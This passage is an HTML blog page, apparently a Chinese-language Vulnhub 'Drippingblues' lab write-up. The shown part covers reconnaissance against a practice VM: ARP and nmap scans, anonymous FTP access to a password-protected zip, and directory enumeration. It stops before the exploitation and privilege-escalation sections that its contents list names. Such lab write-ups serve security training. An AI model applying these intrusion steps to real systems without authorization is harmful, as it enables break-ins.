@@ -1,0 +1,1125 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>Vulnhub Drippingblues - V4ler1an</title><meta name="Description" content="Vulnhub靶场记录--Drippingblues"><meta property="og:title" content="Vulnhub Drippingblues" />
+<meta property="og:description" content="Vulnhub靶场记录--Drippingblues" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.v4ler1an.com/2023/11/vulnhub_drippingblues/" /><meta property="og:image" content="https://www.v4ler1an.com/2023/11/vulnhub_drippingblues/vulnhub.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-11-08T22:57:40+08:00" />
+<meta property="article:modified_time" content="2023-11-08T23:45:40+08:00" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://www.v4ler1an.com/2023/11/vulnhub_drippingblues/vulnhub.png"/>
+<meta name="twitter:title" content="Vulnhub Drippingblues"/>
+<meta name="twitter:description" content="Vulnhub靶场记录--Drippingblues"/>
+<meta name="twitter:site" content="@YaoyaoShaw"/>
+<meta name="application-name" content="V4ler1an">
+<meta name="apple-mobile-web-app-title" content="V4ler1an"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://www.v4ler1an.com/2023/11/vulnhub_drippingblues/" /><link rel="prev" href="https://www.v4ler1an.com/2023/11/vulnhub_ica/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Vulnhub Drippingblues",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/www.v4ler1an.com\/2023\/11\/vulnhub_drippingblues\/"
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "https:\/\/www.v4ler1an.com\/2023\/11\/vulnhub_drippingblues\/vulnhub.png",
+                            "width":  700 ,
+                            "height":  434 
+                        }],"genre": "posts","keywords": "Vulnhub","wordcount":  4009 ,
+        "url": "https:\/\/www.v4ler1an.com\/2023\/11\/vulnhub_drippingblues\/","datePublished": "2023-11-08T22:57:40+08:00","dateModified": "2023-11-08T23:45:40+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": "https:\/\/www.v4ler1an.com\/images\/avatar.png"},"author": {
+                "@type": "Person",
+                "name": "v4ler1an"
+            },"description": "Vulnhub靶场记录--Drippingblues"
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="V4ler1an"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/personal_logo.png"
+        data-srcset="/images/personal_logo.png, /images/personal_logo.png 1.5x, /images/personal_logo.png 2x"
+        data-sizes="auto"
+        alt="/images/personal_logo.png"
+        title="/images/personal_logo.png" />V4ler1an</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/about/"> 我 </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item language" title="选择语言">简体中文<i class="fas fa-chevron-right fa-fw"></i>
+                        <select class="language-select" id="language-select-desktop" onchange="location = this.value;"><option value="/2023/11/vulnhub_drippingblues/" selected>简体中文</option></select>
+                    </a><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="V4ler1an"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/personal_logo.png"
+        data-srcset="/images/personal_logo.png, /images/personal_logo.png 1.5x, /images/personal_logo.png 2x"
+        data-sizes="auto"
+        alt="/images/personal_logo.png"
+        title="/images/personal_logo.png" />V4ler1an</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/about/" title="">我</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a><a href="javascript:void(0);" class="menu-item" title="选择语言">简体中文<i class="fas fa-chevron-right fa-fw"></i>
+                    <select class="language-select" onchange="location = this.value;"><option value="/2023/11/vulnhub_drippingblues/" selected>简体中文</option></select>
+                </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">Vulnhub Drippingblues</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://www.v4ler1an.com" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw"></i>v4ler1an</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/web/"><i class="far fa-folder fa-fw"></i>Web</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2023-11-08">2023-11-08</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 4009 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 9 分钟&nbsp;<span id="/2023/11/vulnhub_drippingblues/" class="leancloud_visitors" data-flag-title="Vulnhub Drippingblues">
+                        <i class="far fa-eye fa-fw"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;次阅读
+                    </span>&nbsp;</div>
+        </div><div class="featured-image"><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/2023/11/vulnhub_drippingblues/vulnhub.png"
+        data-srcset="/2023/11/vulnhub_drippingblues/vulnhub.png, /2023/11/vulnhub_drippingblues/vulnhub.png 1.5x, /2023/11/vulnhub_drippingblues/vulnhub.png 2x"
+        data-sizes="auto"
+        alt="/2023/11/vulnhub_drippingblues/vulnhub.png"
+        title="Vulnhub靶场记录--Drippingblues" /></div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#knowledge">Knowledge</a></li>
+    <li><a href="#1-environment-setup">1. Environment Setup</a></li>
+    <li><a href="#2-reconnaisence">2. Reconnaisence</a>
+      <ul>
+        <li><a href="#1-ip-address">1. IP Address</a></li>
+        <li><a href="#2-port-info">2. Port Info</a></li>
+        <li><a href="#3-web-directory">3. Web Directory</a></li>
+      </ul>
+    </li>
+    <li><a href="#3-exploit">3. Exploit</a>
+      <ul>
+        <li><a href="#1-zip-crack">1. Zip Crack</a></li>
+        <li><a href="#2-url-parameters-fuzz">2. URL Parameters Fuzz</a></li>
+      </ul>
+    </li>
+    <li><a href="#4-privilege-escalation">4. Privilege Escalation</a>
+      <ul>
+        <li><a href="#1-user-login">1. User Login</a></li>
+        <li><a href="#2-privilege-escalation">2. Privilege Escalation</a></li>
+      </ul>
+    </li>
+    <li><a href="#notes">Notes</a>
+      <ul>
+        <li><a href="#思路梳理">思路梳理</a></li>
+        <li><a href="#cve-2021-3560">CVE-2021-3560</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>Vulnhub靶场练习 &ndash; Drippingblues</p>
+<h2 id="knowledge">Knowledge</h2>
+<ul>
+<li>robots.txt - spider  dined</li>
+<li>fcrackzip - zip password crack</li>
+<li>ffuf - url parameters fuzz</li>
+<li>polkit - CVE-2021-4034 privilege escalation</li>
+</ul>
+<h2 id="1-environment-setup">1. Environment Setup</h2>
+<p>靶机下载链接：<a href="https://download.vulnhub.com/drippingblues/drippingblues.ova" target="_blank" rel="noopener noreffer">drippingblues</a></p>
+<p>这个环境直接用VMware没有发现IP的问题，是一个Ubuntu 的desktop环境。</p>
+<h2 id="2-reconnaisence">2. Reconnaisence</h2>
+<h3 id="1-ip-address">1. IP Address</h3>
+<p>arp-scan扫一下ip地址：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/reports/http_172.16.86.144<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ sudo arp-scan -l
+</span></span><span class="line"><span class="cl">Interface: eth0, type: EN10MB, MAC: xxxxx, IPv4: 172.16.86.138
+</span></span><span class="line"><span class="cl">Starting arp-scan 1.10.0 with <span class="m">256</span> hosts <span class="o">(</span>https://github.com/royhills/arp-scan<span class="o">)</span>
+</span></span><span class="line"><span class="cl">172.16.86.1	5e:52:30:c9:b7:65	<span class="o">(</span>Unknown: locally administered<span class="o">)</span>
+</span></span><span class="line"><span class="cl">172.16.86.2	00:50:56:fd:f8:ec	VMware, Inc.
+</span></span><span class="line"><span class="cl">172.16.86.144	00:0c:29:cd:c8:dc	VMware, Inc.
+</span></span><span class="line"><span class="cl">172.16.86.254	00:50:56:fe:01:5c	VMware, Inc.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="m">8</span> packets received by filter, <span class="m">0</span> packets dropped by kernel
+</span></span><span class="line"><span class="cl">Ending arp-scan 1.10.0: <span class="m">256</span> hosts scanned in 2.394 seconds <span class="o">(</span>106.93 hosts/sec<span class="o">)</span>. <span class="m">4</span> responded
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="2-port-info">2. Port Info</h3>
+<p>nmap看下端口信息：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/reports/http_172.16.86.144<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ nmap -T4 -A -Pn 172.16.86.144
+</span></span><span class="line"><span class="cl">Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-11-08 21:01 EST
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 172.16.86.144
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.0024s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">997</span> closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">21/tcp open  ftp     vsftpd 3.0.3
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ftp-syst:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   STAT:
+</span></span><span class="line"><span class="cl"><span class="p">|</span> FTP server status:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      Connected to ::ffff:172.16.86.138
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      Logged in as ftp
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      TYPE: ASCII
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      No session bandwidth limit
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      Session timeout in seconds is <span class="m">300</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      Control connection is plain text
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      Data connections will be plain text
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      At session startup, client count was <span class="m">4</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      vsFTPd 3.0.3 - secure, fast, stable
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_End of status
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_-rwxrwxrwx    <span class="m">1</span> <span class="m">0</span>        <span class="m">0</span>             <span class="m">471</span> Sep <span class="m">19</span>  <span class="m">2021</span> respectmydrip.zip <span class="o">[</span>NSE: writeable<span class="o">]</span>
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">3072</span> 9e:bb:af:6f:7d:a7:9d:65:a1:b1:a1:be:91:cd:04:28 <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> a3:d3:c0:b4:c5:f9:c0:6c:e5:47:64:fe:91:c5:cd:c0 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 4c:84:da:5a:ff:04:b9:b5:5c:5a:be:21:b6:0e:45:73 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-robots.txt: <span class="m">2</span> disallowed entries
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_/dripisreal.txt /etc/dripispowerful.html
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Site doesn<span class="err">&#39;</span>t have a title <span class="o">(</span>text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Service Info: OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 6.75 seconds
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>开放的端口信息：</p>
+<table>
+<thead>
+<tr>
+<th>port</th>
+<th>service</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>21</td>
+<td>FTP</td>
+</tr>
+<tr>
+<td>22</td>
+<td>SSH</td>
+</tr>
+<tr>
+<td>80</td>
+<td>HTTP Web</td>
+</tr>
+</tbody>
+</table>
+<p>对于21端口，首先尝试一下匿名登录：<code>anonymous/anonymous</code>：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tmp<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ ftp 172.16.86.144
+</span></span><span class="line"><span class="cl">Connected to 172.16.86.144.
+</span></span><span class="line"><span class="cl"><span class="m">220</span> <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Name <span class="o">(</span>172.16.86.144:v4ler1an<span class="o">)</span>: anonymous
+</span></span><span class="line"><span class="cl"><span class="m">331</span> Please specify the password.
+</span></span><span class="line"><span class="cl">Password:
+</span></span><span class="line"><span class="cl"><span class="m">230</span> Login successful.
+</span></span><span class="line"><span class="cl">Remote system <span class="nb">type</span> is UNIX.
+</span></span><span class="line"><span class="cl">Using binary mode to transfer files.
+</span></span><span class="line"><span class="cl">ftp&gt; ls
+</span></span><span class="line"><span class="cl"><span class="m">229</span> Entering Extended Passive Mode <span class="o">(||</span><span class="p">|</span>49420<span class="p">|</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="m">150</span> Here comes the directory listing.
+</span></span><span class="line"><span class="cl">-rwxrwxrwx    <span class="m">1</span> <span class="m">0</span>        <span class="m">0</span>             <span class="m">471</span> Sep <span class="m">19</span>  <span class="m">2021</span> respectmydrip.zip
+</span></span><span class="line"><span class="cl"><span class="m">226</span> Directory send OK.
+</span></span><span class="line"><span class="cl">ftp&gt; <span class="nb">pwd</span>
+</span></span><span class="line"><span class="cl">Remote directory: /
+</span></span><span class="line"><span class="cl">ftp&gt; get respectmydrip.zip
+</span></span><span class="line"><span class="cl">local: respectmydrip.zip remote: respectmydrip.zip
+</span></span><span class="line"><span class="cl"><span class="m">229</span> Entering Extended Passive Mode <span class="o">(||</span><span class="p">|</span>5400<span class="p">|</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="m">150</span> Opening BINARY mode data connection <span class="k">for</span> respectmydrip.zip <span class="o">(</span><span class="m">471</span> bytes<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">100% <span class="p">|</span>**************************************************************************************************************************************<span class="p">|</span>   <span class="m">471</span>        8.98 MiB/s    00:00 ETA
+</span></span><span class="line"><span class="cl"><span class="m">226</span> Transfer complete.
+</span></span><span class="line"><span class="cl"><span class="m">471</span> bytes received in 00:00 <span class="o">(</span>629.22 KiB/s<span class="o">)</span>
+</span></span><span class="line"><span class="cl">ftp&gt; <span class="nb">cd</span> /homw
+</span></span><span class="line"><span class="cl"><span class="m">550</span> Failed to change directory.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>把目录下的respectmydrip.zip下载下来，解压时发现需要密码，先暂时搁置。切换目录失败，看来只能拿到这个压缩包了。</p>
+<p>同样的账号密码尝试SSH失败，也正常，ftp和ssh本来就是俩东西。</p>
+<p>访问80端口的web服务：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tmp<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ curl http://172.16.86.144
+</span></span><span class="line"><span class="cl">&lt;html&gt;
+</span></span><span class="line"><span class="cl">&lt;body&gt;
+</span></span><span class="line"><span class="cl">driftingblues is hacked again so it<span class="err">&#39;</span>s now called drippingblues. :D hahaha
+</span></span><span class="line"><span class="cl">&lt;br&gt;
+</span></span><span class="line"><span class="cl">by
+</span></span><span class="line"><span class="cl">&lt;br&gt;
+</span></span><span class="line"><span class="cl">travisscott <span class="p">&amp;</span> thugger
+</span></span><span class="line"><span class="cl">&lt;/body&gt;
+</span></span><span class="line"><span class="cl">&lt;/html&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>页面提示已经被hack了，还留下了两个名字，这俩名字后面可能会有用，比如是ssh的登录用户，实战场景下也就是攻击者留下的后门账户。</p>
+<h3 id="3-web-directory">3. Web Directory</h3>
+<p>对80端口的web directory进行扫描：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tmp<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ dirb http://172.16.86.144 -r
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-----------------
+</span></span><span class="line"><span class="cl">DIRB v2.22
+</span></span><span class="line"><span class="cl">By The Dark Raver
+</span></span><span class="line"><span class="cl">-----------------
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">START_TIME: Wed Nov  <span class="m">8</span> 21:34:40 <span class="m">2023</span>
+</span></span><span class="line"><span class="cl">URL_BASE: http://172.16.86.144/
+</span></span><span class="line"><span class="cl">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+</span></span><span class="line"><span class="cl">OPTION: Not Recursive
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-----------------
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">GENERATED WORDS: <span class="m">4612</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">---- Scanning URL: http://172.16.86.144/ ----
+</span></span><span class="line"><span class="cl">+ http://172.16.86.144/index.php <span class="o">(</span>CODE:200<span class="p">|</span>SIZE:138<span class="o">)</span>
+</span></span><span class="line"><span class="cl">+ http://172.16.86.144/robots.txt <span class="o">(</span>CODE:200<span class="p">|</span>SIZE:78<span class="o">)</span>
+</span></span><span class="line"><span class="cl">+ http://172.16.86.144/server-status <span class="o">(</span>CODE:403<span class="p">|</span>SIZE:278<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-----------------
+</span></span><span class="line"><span class="cl">END_TIME: Wed Nov  <span class="m">8</span> 21:34:44 <span class="m">2023</span>
+</span></span><span class="line"><span class="cl">DOWNLOADED: <span class="m">4612</span> - FOUND: <span class="m">3</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>发现一个robots.txt文件，访问：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tmp<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ curl http://172.16.86.144/robots.txt
+</span></span><span class="line"><span class="cl">User-agent: *
+</span></span><span class="line"><span class="cl">Disallow: /dripisreal.txt
+</span></span><span class="line"><span class="cl">Disallow: /etc/dripispowerful.html
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>访问下:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tmp<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ curl http://172.16.86.144/dripisreal.txt
+</span></span><span class="line"><span class="cl">hello dear hacker wannabe,
+</span></span><span class="line"><span class="cl">
